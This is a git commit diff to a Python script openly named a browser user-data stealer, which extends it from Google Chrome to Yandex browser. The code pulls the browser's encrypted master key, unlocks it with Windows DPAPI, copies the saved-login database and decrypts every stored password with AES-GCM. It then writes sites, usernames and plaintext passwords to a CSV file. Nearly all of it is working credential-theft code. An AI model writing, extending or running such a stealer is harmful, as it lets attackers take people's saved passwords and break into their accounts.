eeafa667852eb2f76a8013c8928ebc7c5eeb208b
Pavlotskiy Ivan <pavlotskiy.iv@gmail.com>
2020-10-06 16:59:26 +0300

    Do several changes
    1) Add Yandex browser support (but still doesn't work);
    2) Remove datetime field
    3) Use copy of browser Database file instead of original one to avoid "DataBase is locked" error

--- py_browser_userdata_stealer.py
+++ py_browser_userdata_stealer.py
@@ -5,27 +5,25 @@ import sys
 import os
 import json
 import base64
-import win32crypt
 import sqlite3
+import shutil
+
+import win32crypt
 from Crypto.Cipher import AES
-import datetime
-import subprocess
 
 # Global variables
 out_file_name = "UserData.csv"
+temp_db = "temp_db.db"
 
 chrome_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data")
 chrome_login_data_path = os.path.join(chrome_user_data_path, "Default", "Login Data")
 chrome_key_path = os.path.join(chrome_user_data_path, "Local State")
 
-def filetime_to_datetime(ft):
-    EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time, the number of 100-nanosecond intervals
-    us = (ft - EPOCH_AS_FILETIME) // 10
-    return datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds = us)
+yandex_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Yandex/YandexBrowser/User Data")
+yandex_login_data_path = os.path.join(yandex_user_data_path, "Default", "Ya Passman Data")
+yandex_key_path = os.path.join(yandex_user_data_path, "Local State")
 
 def steal_GoogleChrome():
-    subprocess.call("taskkill /f /im chrome.exe", shell=True)
-
     with open(chrome_key_path, 'r', encoding='utf-8') as file:
         data = json.load(file)
         encrypted_key = data['os_crypt']['encrypted_key']
@@ -39,18 +37,19 @@ def steal_GoogleChrome():
 
     decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
+    shutil.copyfile(chrome_login_data_path, temp_db)
+
     except_appeared = False
     try:
-        conn = sqlite3.connect(chrome_login_data_path)
+        conn = sqlite3.connect(temp_db)
 
         curs = conn.cursor()
-        curs.execute("SELECT origin_url, username_value, password_value, date_last_used FROM logins")
+        curs.execute("SELECT origin_url, username_value, password_value FROM logins")
 
         login_data = curs.fetchall()
     except sqlite3.DatabaseError as err:
         except_appeared = True
         print("Error with Google Chrome: ", err)
-        print("Make sure Google Chrome is not running and try again")
     finally:
         conn.close()
 
@@ -67,12 +66,13 @@ def steal_GoogleChrome():
     iv_length = 12; # 96 / 8
     auth_tag_length = 16; # 128 / 8
 
-    with open(out_file_name, 'w') as file:
+    with open(out_file_name, 'a') as file:
         file.write("Google Chrome\n\n")
-        file.write("url;username;password;date_last_used\n")
+        file.write("url;username;password\n")
         for raw in login_data:
-            line = ";".join(raw[:-2])
+            line = ";".join(raw[:-1])
             encrypted_password = raw[2]
+
             encrypted_password = encrypted_password[len(version_prefix):]
             iv = encrypted_password[:iv_length]
             auth_tag = encrypted_password[-auth_tag_length:]
@@ -82,20 +82,86 @@ def steal_GoogleChrome():
             password = cipher.decrypt_and_verify(encrypted_password, auth_tag)
             password = password.decode("utf-8")
 
-            date_last_used = filetime_to_datetime(raw[3]*10) # time in Chrome is stored divided by 10 for some reason
-
-            line = line + ";{0};{1}".format(password, date_last_used)
+            line = line + ";{}".format(password)
             file.write(line + "\n")
+        file.write("\n")
+
+    return True
+
+def steal_YandexBrowser():
+    with open(yandex_key_path, 'r', encoding='utf-8') as file:
+        data = json.load(file)
+        encrypted_key = data['os_crypt']['encrypted_key']
+
+    encrypted_key = base64.b64decode(encrypted_key)
+
+    # Key prefix for a key encrypted with DPAPI.
+    DPAPI_key_prefix = "DPAPI"
+
+    encrypted_key = encrypted_key[len(DPAPI_key_prefix):]
+
+    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+    shutil.copyfile(yandex_login_data_path, temp_db)
+
+    except_appeared = False
+    try:
+        conn = sqlite3.connect(temp_db)
+
+        curs = conn.cursor()
+        curs.execute("SELECT origin_url, username_value, password_value FROM logins")
+
+        login_data = curs.fetchall()
+    except sqlite3.DatabaseError as err:
+        except_appeared = True
+        print("Error with Yandex browser: ", err)
+    finally:
+        conn.close()
+
+    if except_appeared:
+        return False
+
+    if not login_data:
+        print("No userdata stored in Yandex browser")
+        return False
+
+    iv_length = 12; # 96 / 8
+    auth_tag_length = 16; # 128 / 8
+
+    with open(out_file_name, 'a') as file:
+        file.write("Yandex browser\n\n")
+        file.write("url;username;password\n")
+        for raw in login_data:
+            line = ";".join(raw[:-1])
+            encrypted_password = raw[2]
+
+            iv = encrypted_password[:iv_length]
+            auth_tag = encrypted_password[-auth_tag_length:]
+            encrypted_password = encrypted_password[iv_length:-auth_tag_length]
+
+            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=iv)
+            password = cipher.decrypt_and_verify(encrypted_password, auth_tag)
+            password = password.decode("utf-8")
+
+            line = line + ";{}".format(password)
+            file.write(line + "\n")
+        file.write("\n")
 
     return True
 
 # Start
 print("Console app that searches for browser user data and writes it to a .csv file\n")
 
+# Create or truncate files
+open(out_file_name, 'w', encoding='utf-8').close()
+open(temp_db, 'w', encoding='utf-8').close()
+
 installed_browsers = []
 
 if os.path.exists(chrome_login_data_path):
     installed_browsers.append("Google Chrome")
+if os.path.exists(yandex_login_data_path):
+    installed_browsers.append("Yandex browser")
 
 if not installed_browsers:
     sys.exit("Couldn't find any browsers on your computer")
@@ -107,8 +173,21 @@ print()
 
 at_least_one = False
 if "Google Chrome" in installed_browsers:
-    if steal_GoogleChrome():
-        at_least_one = True
+    try:
+        if steal_GoogleChrome():
+            at_least_one = True
+    except Exception as e:
+        print("Error with Google Chrome: ", e)
+if "Yandex browser" in installed_browsers:
+    try:
+        if steal_YandexBrowser():
+            at_least_one = True
+    except Exception as e:
+        print("Error with Yandex browser: ", e)
 
 if at_least_one:
     print("\nFile \"{}\" has been successfully created".format(out_file_name))
+else:
+    os.remove(out_file_name)
+
+os.remove(temp_db)
